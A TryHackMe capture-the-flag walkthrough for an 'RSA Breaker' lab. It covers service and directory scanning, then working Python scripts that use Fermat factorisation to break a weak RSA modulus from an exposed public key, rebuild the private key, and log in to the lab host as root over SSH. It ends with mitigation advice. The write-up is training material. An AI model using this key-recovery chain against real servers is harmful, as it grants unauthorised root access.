# RSA Breaker – TryHackMe VAPT Walkthrough Report

**Prepared by:** Nishanth Antony  
**Date:** August 15, 2025  
**Difficulty:** Medium  
**Category:** Cryptography / SSH Exploitation  
**Platform:** TryHackMe (THM)  

---

## 1. Reconnaissance Steps

- **Objective:** Identify open services and enumerate web-facing files.
- **Commands Used:**  
  ```bash
  ping 
  nmap -sV -T4 
  ```
- **Findings:**
  - Open ports: 22 (SSH – OpenSSH 8.2p1), 80 (HTTP – nginx 1.18.0).
  - Both running on Linux.
  - Web enumeration revealed an accessible `id_rsa.pub` (public SSH RSA key).

---

## 2. Exploitation Process

### Step 1 – Directory Bruteforce
- Used `gobuster` to enumerate HTTP content:
  ```bash
  gobuster dir -u http:// -w /usr/share/wordlist/dirb/common.txt
  ```
- Discovered and downloaded the `id_rsa.pub` file.

### Step 2 – RSA Public Key Analysis & Private Key Recovery
- Analyzed the public key, extracted modulus (`n`), and computed its properties.
- **Python scripts used for key analysis and private key recovery:**


Code to get bit size and last 10 digits of modulus

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA

with open('id_rsa.pub', 'r') as file:
    public_key = RSA.import_key(file.read())
bit_size = public_key.size_in_bits()
n = public_key.n
x = str(n)[-10:]

print(f"The size in bits of the public key is: {bit_size}")
print(f"The last 10 digits of the public key are: {x}")
```


---


Code to factorize RSA modulus and get difference of factors

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from gmpy2 import isqrt

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will always be 2
    if (n & 1) == 0:
        return (n//2, 2)
    a = isqrt(n)
    if a * a == n:
        return a, a
    while True:
        a += 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break
    return a + b, a - b

with open('id_rsa.pub', 'r') as file:
    public_key = RSA.import_key(file.read())
bit_size = public_key.size_in_bits()
n = public_key.n
x = str(n)[-10:]
p, q = factorize(n)
print(f"The size in bits of the public key is: {bit_size}")
print(f"The last 10 digits of the public key are: {x}")
print(f"The difference between p and q is: {p - q}")
```


---


Code to reconstruct private key from public key (and save to PEM)

```python
#!/usr/bin/env python3
from Crypto.PublicKey import RSA
from gmpy2 import isqrt, invert, lcm

def factorize(n):
    # since even nos. are always divisible by 2, one of the factors will always be 2
    if (n & 1) == 0:
        return (n//2, 2)
    a = isqrt(n)
    if a * a == n:
        return a, a
    while True:
        a += 1
        bsq = a * a - n
        b = isqrt(bsq)
        if b * b == bsq:
            break
    return a + b, a - b

def get_private_key(e, p, q):
    # Calculate the modular inverse
    return invert(e, lcm(p - 1, q - 1))

with open('id_rsa.pub', 'r') as file:
    public_key = RSA.import_key(file.read())
bit_size = public_key.size_in_bits()
n = public_key.n
x = str(n)[-10:]
e = 65537
p, q = factorize(n)
d = get_private_key(e, p, q)
private_key = RSA.construct((n, e, int(d)))
with open('id_rsa', 'wb') as file:
    file.write(private_key.export_key('PEM'))
print(f"The size in bits of the public key is: {bit_size}")
print(f"The last 10 digits of the public key are: {x}")
print(f"The difference between p and q is: {p - q}")
print(f"The value of the private key is {d}")
print("You can find your key in this directory.")
```


---

### Step 3 – SSH Access as root
- Set file permissions for your generated private key:
  ```bash
  chmod 600 id_rsa
  ```
- Logged in via SSH using the reconstructed private key:
  ```bash
  ssh -i id_rsa root@
  ```
- Gained root shell and retrieved the server flag:
  ```bash
  cat flag
  ```
- Successfully captured the target flag.

---

## 3. Proof of Concept (PoC)

- Used directory bruteforce and public key cryptanalysis to break SSH security.
- Python code (above) fully demonstrates how the private key was calculated and exploited.

---

## 4. Privilege Escalation

- None required. The calculated private key enabled direct root SSH access.

---

## 5. Mitigation Recommendations

- **Never expose cryptographic key material** (public or private) on web-accessible directories.
- Use strong, randomly-created RSA primes so factorization attacks can't succeed.
- Regularly audit publicly-accessible directories for sensitive files.
- Limit root SSH login, rotate keys, and monitor for suspicious access.

---

## 6. Lessons Learned

- Exposing pubkey files can allow attackers to break into SSH easily if the modulus is weak.
- Python and open-source crypto libraries can be used to launch and automate advanced attacks.
- Directory scanning and file analysis are vital in both cryptography and application security.

---

## 7. Skills Practiced

- Service enumeration and directory bruteforce
- RSA modulus analysis and factorization
- Private key reconstruction and SSH exploitation
- Secure reporting and explicit code documentation

---
